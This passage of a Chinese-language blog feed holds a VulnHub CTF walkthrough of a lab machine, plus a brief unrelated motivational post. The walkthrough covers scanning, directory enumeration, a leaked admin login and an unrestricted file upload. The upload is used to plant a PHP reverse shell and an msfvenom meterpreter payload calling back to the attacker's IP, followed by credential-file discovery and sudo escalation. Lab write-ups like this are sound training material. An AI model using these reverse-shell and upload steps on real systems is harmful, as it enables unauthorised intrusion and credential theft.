bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.110</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 10:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.110</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">MAC Address: 08:00:27:C2:CD:2E (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.15 seconds</span><br></pre></td></tr></table></figure><br><p>浏览器访问如下：</p><br><p><img src="2020-02-10%2013-55-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>网站的话，需要先收集一下目录信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.110 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2009-31-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://192.168.56.110</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.110</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2009-32-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="2020-02-10%2009-33-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-1581314672000.png" alt=""> </p><br><p><code>robots</code> 总会有些东西泄露：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin_area<span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /r00t<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /uploads      <span class="comment"># ----- Not Found 404</span></span><br><span class="line">Disallow: /uploaded_files <span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /flag <span class="comment"># ----- OK 200</span></span><br></pre></td></tr></table></figure><p>逐一访问后得到可用目录如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110/index.php<span class="comment"># 主页</span></span><br><span class="line">http://192.168.56.110/flag/<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/assets<span class="comment"># 引用资源页面，包含图片（疑似有内容，先搁置）</span></span><br><span class="line">http://192.168.56.110/admin_area/<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/robots.txt<span class="comment"># robots</span></span><br><span class="line">http://192.168.56.110/uploaded_files<span class="comment"># 疑似与文件上传有关</span></span><br></pre></td></tr></table></figure><br><p>访问 <code>/flag</code> 得到 第一个 Flag ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure><br><p>访问 <code>uploaded_files</code> 空白页，但返回 <code>200 OK</code> 。无源代码</p><br><p>访问 <code>admin_area</code> ，源代码内发现第二个 Flag 及一组用户名密码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--username : admin</span></span><br><span class="line"><span class="comment">password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="comment">The 2nd flag is : &#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="打开大门"><a href="#打开大门" class="headerlink" title="打开大门"></a>打开大门</h2><br><p>使用得到的用户名密码登录 SSH 无效，但成功登录 Web 页面，一个文件上传服务：</p><br><p><img src="2020-02-10%2009-36-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>上传照片返回成功，上传 <code>php</code> 页面也成功，可知并没有黑白名单</p><p>可以上传一句话木马 + Nc 或用 <code>msfvenom</code> 生成 MSF 的 php 反弹木马</p><br><p><strong>使用 kali 上的木马</strong>  （<code>/usr/share/webshell</code>）</p><br><ul><li><code>cp /usr/share/webshell/php/php-reverse-shell.php ~/Desktop/php-shell.php</code> </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ip = <span class="string">'192.168.56.109'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">8848</span>;       <span class="comment">// CHANGE THIS</span></span><br></pre></td></tr></table></figure><br><p>监听端口。访问：<code>http://192.168.56.110/uploaded_files/php-shell.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8848</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2014-50-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p><strong>使用 MSF 的 php 反弹木马</strong> </p><br><p>生成木马，并监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.109 LPORT=8848 --format raw --out /root/桌面/msf_php.php</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2010-42-35%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2010-48-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>查看 Web的根目录，从 <code>hint.txt</code> 找到了第三个 FLAG，并说明了使用 <code>technawi</code>  的用户才可以读取 <code>flag.txt</code> 且在一个隐藏目录里面</p><br><p><img src="2020-02-10%2010-51-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2011-01-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>查看 <code>/etc/passwd</code> 除了 <code>technawi</code> 的 HOME 目录，无其他有用信息</p><br><p>那就搜索文件中包含 <code>technawi</code> 关键字的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user <span class="string">"technawi"</span> -<span class="built_in">type</span> f ! -path <span class="string">"/proc/*"</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -ri --exclude-dir=proc/ <span class="string">'technawi'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2011-15-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>发现了一个 MySQL 的 认证TXT，找到第四个 FLAG 附带一组账号密码，成功登录 SSH，并拿到最后一个 FLAG</p><br><p><img src="2020-02-10%2011-16-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2011-31-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><h2 id="提权-额外"><a href="#提权-额外" class="headerlink" title="提权(额外)"></a>提权(额外)</h2><br><p>其中，<code>technawi</code> HOME 目录下有个名为 <code>.sudo_as_admin_successful</code> 的文件，</p><p>意味着 <code>technawi</code> 可以用自己的密码登录成为 root 用户（提权）</p><br><p><img src="2020-02-10%2011-34-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><hr><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110/robots.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /admin_area</span><br><span class="line">Disallow: /r00t</span><br><span class="line">Disallow: /uploads      ----- Not Found 404</span><br><span class="line">Disallow: /uploaded_files ----- OK 200</span><br><span class="line">Disallow: /flag </span><br><span class="line">================</span><br><span class="line">http://192.168.56.110/admin_area/</span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">&lt;!--username : admin</span><br><span class="line">password : 3v1l_H@ck3r</span><br><span class="line">The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/assets/img/</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">[IMG]background_tile_1.jpg2017-04-19 10:43 2.3K </span><br><span class="line">[IMG]background_tile_2.jpg2017-04-19 10:43 2.4K </span><br><span class="line">[IMG]background_tile_3.jpg2017-04-19 10:43 2.3K </span><br><span class="line">[IMG]blue_line.jpg2017-04-19 10:43 1.3K </span><br><span class="line">[IMG]done.png2017-04-19 10:43 3.3K </span><br><span class="line">[IMG]logo.jpg2017-04-19 10:43 11K </span><br><span class="line">[IMG]tzine.png2017-04-19 10:43 1.2K </span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/flag/</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/server-status</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">注意 Cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">http://192.168.56.110/index.php</span><br><span class="line"></span><br><span class="line">登录后：</span><br><span class="line"></span><br><span class="line">Powered by : Technawi[dot]net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">meterpreter &gt; cat hint.txt</span><br><span class="line">try to find user technawi password to <span class="built_in">read</span> the flag.txt file, you can find it <span class="keyword">in</span> a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">cat /etc/mysql/conf.d/credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">technawi@Jordaninfosec-CTF01:~$ cat /var/www/html/flag.txt </span><br><span class="line">The 5th flag is : &#123;5473215946785213456975249&#125;</span><br><span class="line"></span><br><span class="line">Good job :)</span><br><span class="line"></span><br><span class="line">You find 5 flags and got their points and finish the first scenario....</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Try Harder</title>
      <link href="/2020/02/29/Test/"/>
      <url>/2020/02/29/Test/</url>
      
        <content type="html"><![CDATA[<br><p>新的一年，新的挑战，新的目标，为了这个目标，Try Harder</p><br>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
